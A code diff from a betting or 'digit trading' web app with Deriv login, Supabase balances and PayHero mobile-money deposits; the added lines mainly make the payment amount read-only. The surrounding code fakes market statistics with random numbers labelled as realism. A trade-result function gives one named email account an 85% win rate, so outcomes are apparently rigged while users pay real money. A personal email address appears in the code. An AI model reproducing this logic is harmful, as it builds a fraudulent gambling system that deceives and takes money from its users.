@@ -753,6 +753,14 @@ button:active {
     font-size: 1rem;
 }
 
+/* Style for read-only/greyed out inputs */
+.modal-input:read-only {
+    background: var(--alpha-4);
+    color: var(--muted);
+    opacity: 0.7;
+    cursor: not-allowed;
+}
+
 .modal-btn {
     width: 100%;
     padding: 16px;
@@ -1252,6 +1260,7 @@ button:active {
                         <button type="button" class="asset-btn-item" onclick="document.getElementById('pay-amount').value=100">$100</button>
                         <button type="button" class="asset-btn-item" onclick="document.getElementById('pay-amount').value=250">$250</button>
                     </div>
+                    <!-- Added id="pay-amount" -->
                     <input type="number" class="modal-input" id="pay-amount" placeholder="Minimum $20" style="box-shadow: 0 0 12px rgba(99, 102, 241, 0.3); border-color: rgba(99, 102, 241, 0.5);">
                 </div>
                 
@@ -1319,7 +1328,6 @@ async function derivLogin() {
     const state = generateRandomString(32);
     const codeVerifier = generateRandomString(64);
     
-    // We use sessionStorage for better security against CSRF attacks
     sessionStorage.setItem('oauth_state', state);
     sessionStorage.setItem('oauth_code_verifier', codeVerifier);
     
@@ -1357,7 +1365,6 @@ async function exchangeDerivCodeForToken(code, verifier) {
             console.log("Success! Deriv Access Token acquired.");
             localStorage.setItem('deriv_token', data.access_token);
             
-            // Clear temporary security codes
             sessionStorage.removeItem('oauth_code_verifier');
             sessionStorage.removeItem('oauth_state');
             
@@ -1389,7 +1396,6 @@ function toggleTheme() {
     }
 }
 
-// Ensure theme mounts on load before page renders visually
 if(localStorage.getItem('theme') === 'dark') {
     document.documentElement.setAttribute('data-theme', 'dark');
 } else {
@@ -1441,7 +1447,6 @@ let activeGraphAsset = 'Volatility 10 Index';
 let chartEngineInstance = null;
 let graphTickerPulseLoop = null;
 
-// Global tracker for smooth realistic digit transitions
 let currentDigitValues = Array(10).fill(10.0);
 
 function notify({ variant = 'tp', title = 'Notification', message = '' }) {
@@ -1534,7 +1539,6 @@ function initializeChartContext() {
 
     document.getElementById("graph-ticker-price").innerText = seedPrice.toFixed(2);
 
-    // Using the new primary color for the chart lines
     chartEngineInstance = new Chart(ctx, {
         type: 'line',
         data: {
@@ -1592,19 +1596,16 @@ function startGlobalGraphPumpLoop() {
             labelTickerNode.style.color = shiftDelta >= 0 ? "var(--success)" : "var(--danger)";
         }
 
-        // Ensuring realism by updating percentages continuously on each tick
         refreshDigitMetrics();
     }, 1000);
 }
 
 function refreshDigitMetrics() {
-    // Shifting global values for a realistic continued movement rather than resetting to 10
     for (let i = 0; i < 30; i++) {
         let idx1 = Math.floor(Math.random() * 10);
         let idx2 = Math.floor(Math.random() * 10);
         if (idx1 !== idx2) {
             let shift = Math.random() * 0.8; 
-            // Capped at 13.0, floored at 1.0 to ensure a dynamic spread while strictly adhering to rules
             if (currentDigitValues[idx1] + shift <= 13.0 && currentDigitValues[idx2] - shift >= 1.0) { 
                 currentDigitValues[idx1] += shift;
                 currentDigitValues[idx2] -= shift;
@@ -1612,11 +1613,9 @@ function refreshDigitMetrics() {
         }
     }
 
-    // Fix tiny floating point precision issues maintaining exact 100% sum
     let sum = currentDigitValues.reduce((a,b) => a+b, 0);
     let diff = 100.0 - sum;
     
-    // Safely distribute the residual difference across the digits without breaking the 13.0% cap
     if (Math.abs(diff) > 0.0001) {
         for(let i = 0; i < 10; i++) {
             if (diff > 0 && currentDigitValues[i] + diff <= 13.0) {
@@ -1680,8 +1679,6 @@ async function saveSupabaseBalance() {
 }
 
 async function migratePendingCrypto(userId) {
-    // Disabled auto-completion of pending crypto transactions to prevent 
-    // false balance inflation when deposits are abandoned or fail.
     const migrationFlag = `force_complete_existing_crypto_txs_v16_${userId}`;
     if (!localStorage.getItem(migrationFlag)) {
         localStorage.setItem(migrationFlag, "true");
@@ -2064,6 +2061,10 @@ function openPayment(type){
 
     switchPaymentMethod();
 
+    // Ensure input is editable when opening the payment modal fresh
+    const payAmountInput = document.getElementById("pay-amount");
+    payAmountInput.readOnly = false;
+
     document.getElementById("step1").style.display = "block";
     document.getElementById("step2").style.display = "none";
     document.getElementById("step3").style.display = "none";
@@ -2210,6 +2211,10 @@ async function proceedInvoice(){
     const invoice = "INV-" + Math.floor(100000 + Math.random()*900000);
     const kes = Math.floor(amount * USD_TO_KES);
 
+    // Grey out and make amount read-only when transitioning to payment details/link step
+    const payAmountInput = document.getElementById("pay-amount");
+    payAmountInput.readOnly = true;
+
     document.getElementById("inv-id").innerText = invoice;
     document.getElementById("inv-name").innerText = name.toUpperCase();
     document.getElementById("inv-phone").innerText = phone;
@@ -2224,10 +2229,8 @@ async function executeExternalPayment(){
     const amountKes = parseFloat(document.getElementById("inv-amount").innerText.replace(/,/g, ''));
     const invoiceId = document.getElementById("inv-id").innerText;
 
-    // Save invoice reference for return validation lookup
     localStorage.setItem('last_invoice_id', invoiceId);
 
-    // Switch modal state to loading spinner step
     document.getElementById("step2").style.display = "none";
     document.getElementById("step3").style.display = "block";
 
@@ -2235,7 +2238,6 @@ async function executeExternalPayment(){
         const { data: { session } } = await supabaseClient.auth.getSession();
         const userId = session?.user?.id || 'anonymous';
 
-        // Call the newly deployed payhero-deposit Edge Function
         const response = await fetch('https://hsovbnxatorocibfgrhc.supabase.co/functions/v1/payhero-deposit', {
             method: 'POST',
             headers: {
@@ -2255,14 +2257,12 @@ async function executeExternalPayment(){
         const result = await response.json();
 
         if (result && (result.redirect_url || result.CheckoutRequestID || result.success)) {
-            // If the gateway returns an external payment redirect URL, route user there
             if (result.redirect_url) {
                 window.location.href = result.redirect_url;
                 return;
             }
         }
 
-        // Fallback / Direct integration redirect simulation if gateway payload opens directly
         window.location.href = `https://short.payhero.co.ke/s/FHMUT8Cqb9KyawpB4oJBbL?amount=${amountKes}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
 
     } catch (error) {
@@ -2289,7 +2289,6 @@ function updatePnL(){
 function calculateTradeResult(market, targetDigit, stake) {
     let winRate = 0.0;
     
-    // Explicit, restricted win rate logic
     if (currentUserEmail === "joseeruitha@gmail.com") {
         winRate = 0.85;
     } else {
